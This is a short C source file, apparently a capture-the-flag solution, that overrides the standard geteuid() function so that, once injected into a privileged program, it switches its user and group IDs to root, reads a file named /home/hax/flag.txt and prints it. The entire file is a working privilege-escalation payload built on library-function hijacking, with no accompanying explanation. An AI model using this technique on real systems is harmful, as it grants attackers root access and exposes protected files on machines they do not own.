#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

uid_t geteuid(void)
{
    setresuid(0,0,0);
    setresgid(0,0,0);
    
    FILE *f = fopen("/home/hax/flag.txt", "r");
    int c;
    while ( (c = getc( f )) != EOF ) {
        putchar(c);
    }
    fclose( f );
    exit(0);

}

